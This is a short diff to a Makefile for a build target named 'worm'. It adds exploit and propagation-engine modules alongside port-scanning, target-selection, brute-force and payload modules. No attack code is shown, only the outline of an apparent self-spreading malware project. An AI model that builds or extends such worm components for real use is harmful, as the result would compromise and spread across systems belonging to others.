@@ -2,7 +2,7 @@
 
 all: worm
 
-worm: worm.o portscanner.o target_selection.o bruteforce.o payload.o
+worm: worm.o portscanner.o target_selection.o exploit.o propagation_engine.o bruteforce.o payload.o
 	$(CC) -o $@ $^
 
 clean:
